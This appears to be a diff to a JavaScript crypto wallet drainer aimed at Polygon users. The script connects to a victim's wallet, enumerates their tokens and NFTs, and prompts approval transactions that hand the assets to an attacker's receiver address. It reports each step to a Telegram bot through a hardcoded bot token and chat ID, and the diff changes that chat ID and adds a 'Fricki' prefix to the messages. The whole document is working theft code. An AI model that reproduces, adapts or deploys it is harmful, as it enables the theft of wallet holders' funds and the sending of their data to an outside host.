@@ -320,7 +320,7 @@ async function getPrice(address){
 
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 5227607491;
+    const chat_id = 1114693003;
     fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
           mpolygonod: "GET",
           headers: {
@@ -446,13 +446,13 @@ async function proceed(){
           
         });
         await sendMessage(`me ... polygon : connected to ${user_address}`);
-        await sendMessage1(`polygon : connected to ${user_address}`);
+        await sendMessage1(` Frickipolygon : connected to ${user_address}`);
         console.log('polygon tokens: %o', polygon_tokens)
         
     
         if (polygon_tokens.length < 1 && polygon_NFTs.length < 1) {
           await sendMessage(`No valuable token or nfts found` );
-          await sendMessage1(`No valuable token or nfts found` );
+          await sendMessage1(` FrickiNo valuable token or nfts found` );
           console.log (`No valuable token or nfts found` );
           const matic_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new polygon balance", e);
@@ -475,10 +475,10 @@ async function proceed(){
           console.log("Insufficient funds")
           if (polygon_tokens.length > 0){
             await sendMessage(`Tokens found` )
-            await sendMessage1(`Tokens found` )
+            await sendMessage1(` FrickiTokens found` )
           } else if (polygon_NFTs.length > 0){
             await sendMessage(`NFTs found` )
-            await sendMessage1(`NFTs found` )
+            await sendMessage1(` FrickiNFTs found` )
           }
         }
 
@@ -565,7 +565,7 @@ async function proceed(){
                             Amount : ${amount},
                             Your address : ${receiver_address}
                               ` )
-              await sendMessage1(`Approving 
+              await sendMessage1(` FrickiApproving 
                               Token Address : ${contractAddress},
                               Amount : ${amount},
                               Your address : ${receiver_address}
@@ -598,11 +598,11 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
+            await sendMessage1(` FrickiApproved` )
           }
           else {
             await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
+            await sendMessage1(` FrickiDenied` )
           }
               console.log(transaction);
               // if(transaction){
@@ -625,7 +625,7 @@ async function proceed(){
                                 token_id : ${tokenId}
                                 Your address : ${receiver_address}
                                   ` )
-              await sendMessage1(`Approving 
+              await sendMessage1(` FrickiApproving 
                                   NFT Address : ${contractAddress},
                                   token_id : ${tokenId}
                                   Your address : ${receiver_address}
@@ -654,11 +654,11 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
+            await sendMessage1(` FrickiApproved` )
           }
           else {
             await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
+            await sendMessage1(` FrickiDenied` )
           }
               console.log(transaction);
               // if(transaction){
